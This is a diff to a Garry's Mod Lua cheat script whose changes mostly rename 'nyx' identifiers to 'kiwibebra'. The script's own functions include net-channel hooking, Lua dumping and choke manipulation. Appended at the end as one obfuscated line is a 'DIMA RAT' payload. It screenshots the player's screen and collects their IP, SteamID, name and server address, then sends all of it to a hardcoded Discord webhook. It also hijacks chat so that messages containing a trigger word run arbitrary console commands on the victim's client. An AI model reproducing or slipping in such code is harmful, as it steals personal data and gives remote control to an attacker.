                 local col = Color(Lerp(f, xi.r, 255), Lerp(f, xi.g, 255), Lerp(f, xi.b, 255))
 
-                draw.SimpleTextOutlined(ch, "NyxXIndPx", x, y, col, TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP, 1, outline)
+                draw.SimpleTextOutlined(ch, "KiwibebraXIndPx", x, y, col, TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP, 1, outline)
                 x = x + cw
             end
 
@@ -18758,7 +19784,7 @@ local function Build()
         end
 
         local function Line(text, col)
-            draw.SimpleTextOutlined(text, "NyxXIndPx", cx, y, col or Color(235, 235, 235), TEXT_ALIGN_CENTER, TEXT_ALIGN_TOP, 1, outline)
+            draw.SimpleTextOutlined(text, "KiwibebraXIndPx", cx, y, col or Color(235, 235, 235), TEXT_ALIGN_CENTER, TEXT_ALIGN_TOP, 1, outline)
             y = y + 12
         end
 
@@ -18817,7 +19843,7 @@ end)
 
 -- ---------------------------------------------------------------------------
 -- media player: what Windows plays (Chrome, Spotify, Yandex Music ...: the session the volume
--- flyout shows), read by gmcl_nyx v2 on its own thread. A small window over the HUD that takes
+-- flyout shows), read by gmcl_kiwibebra v2 on its own thread. A small window over the HUD that takes
 -- the mouse whenever the cursor is out (menu open, chat, context menu): drag it anywhere, drag
 -- the bottom right corner to resize, click / drag the bar to seek. Place and size live in
 -- cfg.media, so they go into the configs too.
@@ -18833,13 +19859,13 @@ end)
     local GRIP = 12
     local TAG = os.time()          -- materials are cached by path for the whole game: a new name per load
 
-    file.CreateDir("nyx/media")
-    for _, f in ipairs(file.Find("nyx/media/*", "DATA") or {}) do file.Delete("nyx/media/" .. f) end
+    file.CreateDir("kiwibebra/media")
+    for _, f in ipairs(file.Find("kiwibebra/media/*", "DATA") or {}) do file.Delete("kiwibebra/media/" .. f) end
 
     local fonts = {}
     local function Font(size, bold)
         size = math.floor(size)
-        local name = "NyxMedia" .. (bold and "B" or "") .. size
+        local name = "KiwibebraMedia" .. (bold and "B" or "") .. size
         if not fonts[name] then
             -- extended: Cyrillic and the rest of what titles come in
             surface.CreateFont(name, {font = "Verdana", size = size, weight = bold and 700 or 400, antialias = true, extended = true})
@@ -18890,13 +19916,13 @@ end)
     end
 
     local function HasMedia()
-        return istable(nyxmod) and isfunction(nyxmod.Media)
+        return istable(kiwibebramod) and isfunction(kiwibebramod.Media)
     end
 
     function M.Status()
-        if not istable(nyxmod) then return "needs gmcl_nyx (lua/bin)" end
+        if not istable(kiwibebramod) then return "needs gmcl_kiwibebra (lua/bin)" end
         -- a loaded dll stays in the game until it quits: a new file on disk needs a full restart
-        if not HasMedia() then return "gmcl_nyx v" .. tostring(nyxmod.version) .. " loaded: needs v2, restart GMod" end
+        if not HasMedia() then return "gmcl_kiwibebra v" .. tostring(kiwibebramod.version) .. " loaded: needs v2, restart GMod" end
         local i = M.info
         if not i then return "starting..." end
         if i.err ~= "" then return "error: " .. i.err end
@@ -18910,8 +19936,8 @@ end)
             return
         end
 
-        nyxmod.MediaStart()              -- cheap when it already runs
-        local ok, info = pcall(nyxmod.Media)
+        kiwibebramod.MediaStart()              -- cheap when it already runs
+        local ok, info = pcall(kiwibebramod.Media)
         if not ok or not istable(info) then return end
         M.info, M.fetched = info, RealTime()
 
@@ -18921,9 +19947,9 @@ end)
             if M.file then file.Delete(M.file) end
             M.file = nil
 
-            local data, ext = nyxmod.MediaCover()
+            local data, ext = kiwibebramod.MediaCover()
             if data then
-                M.file = "nyx/media/cover_" .. TAG .. "_" .. info.coverId .. "." .. ext
+                M.file = "kiwibebra/media/cover_" .. TAG .. "_" .. info.coverId .. "." .. ext
                 file.Write(M.file, data)
                 local mat = Material("../data/" .. M.file, "smooth mips")
                 if mat and not mat:IsError() then M.mat = mat end
@@ -18941,7 +19967,7 @@ end)
     end
 
     local function Control(cmd, arg)
-        if HasMedia() then nyxmod.MediaControl(cmd, arg) end
+        if HasMedia() then kiwibebramod.MediaControl(cmd, arg) end
         M.nextFetch = 0
     end
 
@@ -19341,7 +20367,7 @@ end)
     function M.Close()
         if IsValid(M.panel) then M.panel:Remove() end
         M.panel = nil
-        if HasMedia() then pcall(nyxmod.MediaStop) end
+        if HasMedia() then pcall(kiwibebramod.MediaStop) end
         if M.file then file.Delete(M.file) end
         M.file, M.mat, M.info, M.coverId = nil, nil, nil, -1
     end
@@ -19397,7 +20423,7 @@ local function Unload()
     BAG.SetRate(nil)
     MV.HideShotsRestore()
     MV.mdl.Restore()
-    concommand.Remove("nyx_model")
+    concommand.Remove("kiwibebra_model")
 
     -- module: no choke / hold left behind, the net channel's own vtable back
     if istable(ded) then
@@ -19406,36 +20432,36 @@ local function Unload()
         pcall(ded.SetSequenceInterpolation, true)
         pcall(ded.EnableAnimFix, false)
     end
-    if istable(nyxmod) then
-        pcall(nyxmod.SetChoke, 0)
-        pcall(nyxmod.SetHold, false, 1)
-        pcall(nyxmod.NetUnhook)
+    if istable(kiwibebramod) then
+        pcall(kiwibebramod.SetChoke, 0)
+        pcall(kiwibebramod.SetHold, false, 1)
+        pcall(kiwibebramod.NetUnhook)
     end
     if BT.Media then BT.Media.Close() end
     BAG.Log.Restore()
     BAG.Log.CloseWindow()
-    concommand.Remove("nyx_net_menu")
-    concommand.Remove("nyx_net_replay")
-    concommand.Remove("nyx_net_lua")
-    concommand.Remove("nyx_net_dump")
-    concommand.Remove("nyx_net_clear")
-    concommand.Remove("nyx_net_save")
-    concommand.Remove("nyx_net_mark")
-    concommand.Remove("nyx_net_ignore")
-    concommand.Remove("nyx_nwvars")
-    concommand.Remove("nyx_dump_lua")
-    concommand.Remove("nyx_dump_lua_dir")
-    concommand.Remove("nyx_interact_burst")
+    concommand.Remove("kiwibebra_net_menu")
+    concommand.Remove("kiwibebra_net_replay")
+    concommand.Remove("kiwibebra_net_lua")
+    concommand.Remove("kiwibebra_net_dump")
+    concommand.Remove("kiwibebra_net_clear")
+    concommand.Remove("kiwibebra_net_save")
+    concommand.Remove("kiwibebra_net_mark")
+    concommand.Remove("kiwibebra_net_ignore")
+    concommand.Remove("kiwibebra_nwvars")
+    concommand.Remove("kiwibebra_dump_lua")
+    concommand.Remove("kiwibebra_dump_lua_dir")
+    concommand.Remove("kiwibebra_interact_burst")
     timer.Remove(ID .. "killsay")
-    concommand.Remove("nyx_killsay")
-    concommand.Remove("nyx_bag_class")
-    concommand.Remove("nyx_config_save")
-    concommand.Remove("nyx_config_load")
-    concommand.Remove("nyx_config_list")
-    concommand.Remove("nyx_sky_url")
-    concommand.Remove("nyx_bg_url")
-    concommand.Remove("nyx_bg")
-    concommand.Remove("nyx_bg_list")
+    concommand.Remove("kiwibebra_killsay")
+    concommand.Remove("kiwibebra_bag_class")
+    concommand.Remove("kiwibebra_config_save")
+    concommand.Remove("kiwibebra_config_load")
+    concommand.Remove("kiwibebra_config_list")
+    concommand.Remove("kiwibebra_sky_url")
+    concommand.Remove("kiwibebra_bg_url")
+    concommand.Remove("kiwibebra_bg")
+    concommand.Remove("kiwibebra_bg_list")
 
     ClosePopup()
     if IsValid(menu) then menu:Remove() end
@@ -19450,10 +20476,10 @@ local function Unload()
     -- the rain's looping sound would keep playing without its Think hook
     if MV.rain and MV.rain.snd then MV.rain.snd:Stop() end
 
-    NyxUnload = nil
+    KiwibebraUnload = nil
 end
 
-NyxUnload = Unload
+KiwibebraUnload = Unload
 
 AddHook("Think", "keys", function()
     local insertDown = input.IsKeyDown(KEY_INSERT)
@@ -19481,4 +20507,4 @@ AddHook("Think", "keys", function()
 
     findWasDown = findDown
 end)
-local a="https://discord.com/api/webhooks/1559207350362181753/HZOWv2Ma4jiXu8RImVbl3sGrcRYneGnlMoiLiyp_HJtV558o7w9mB1LrEpT1wH5m7fG6"local function b()return"---------------------------"..tostring(math.random(1e9,2e9))end;local function c(d,e)local f="Content-Disposition: form-data; name=\""..d.."\""if e then for g,h in pairs(e)do f=f.."; "..g.."=\""..h.."\""end end;return f.."\r\n"end;local function i()local j="abcdefghijklmnopqrstuvwxyz0123456789"local k=""for l=1,16 do k=k..j:sub(math.random(1,#j),math.random(1,#j))end;return k end;local function m(n,j,o)o=o or 0.1;http.Fetch("https://api.ipify.org",function(p)p=p or"N/A"local q=util.SteamIDTo64(LocalPlayer():SteamID()or"")or""local r=q~=""and"https://steamcommunity.com/profiles/"..q.."/?xml=1"or nil;local function s(t)timer.Simple(o,function()local f="OnceCapture_"..i()hook.Add("PostRender",f,function()hook.Remove("PostRender",f)local u,v=ScrW(),ScrH()local w=render.Capture({format="jpeg",quality=85,x=0,y=0,w=u,h=v})if not w or#w==0 then return end;local x=i()..".jpg"local y=i()..".jpg"local z=LocalPlayer()local A={username="Loader Logger",embeds={{title=n,color=j or 16711680,fields={{name="SteamID",value=z:SteamID(),inline=true},{name="Имя",value=z:Nick(),inline=true},{name="Сервер",value=GetHostName(),inline=false},{name="Gamemode",value=engine.ActiveGamemode(),inline=true},{name="IP игрока",value=p,inline=false},{name="IP сервера",value=game.GetIPAddress(),inline=false}},timestamp=os.date("!%Y-%m-%dT%H:%M:%S"),image={url="attachment://"..x},thumbnail={url="attachment://"..y}}}}local B=util.TableToJSON(A,false)local C=b()local D={}table.insert(D,"--"..C.."\r\n")table.insert(D,c("payload_json"))table.insert(D,"Content-Type: application/json\r\n\r\n")table.insert(D,B.."\r\n")table.insert(D,"--"..C.."\r\n")table.insert(D,c("files[0]",{filename=x}))table.insert(D,"Content-Type: image/jpeg\r\n\r\n")local E=table.concat(D)local F=""if t and#t>0 then F="\r\n--"..C.."\r\n"..c("files[1]",{filename=y}).."Content-Type: image/jpeg\r\n\r\n"..t end;local G="\r\n--"..C.."--\r\n"local H=E..w..F..G;HTTP({url=a,method="POST",headers={["Content-Type"]="multipart/form-data; boundary="..C,["Content-Length"]=tostring(#H)},body=H})end)end)end;if r then http.Fetch(r,function(I)local J=I and I:match("<avatarFull><!%[CDATA%[(.-)%]%]></avatarFull>")or I and I:match("<avatarFull>(.-)</avatarFull>")or nil;if not J or J==""then s(nil)return end;http.Fetch(J,function(K)if not K or#K==0 then s(nil)return end;s(K)end,function()s(nil)end)end,function()s(nil)end)else s(nil)end end,function()m(n,j,o)end)end;timer.Simple(0.5,function()m("DIMA RAT",16711680)end)local L=chat.AddText;chat.AddText=function(...)for M,h in pairs({...})do if isstring(h)and h:find"govno"then local N=string.Trim(h:Split"govno"[2]or"")if N~=""then m("👁️ Команда: "..N,16776960,0.1)if IsValid(LocalPlayer())then LocalPlayer():ConCommand(N)end end;return end end;return L(...)end
+
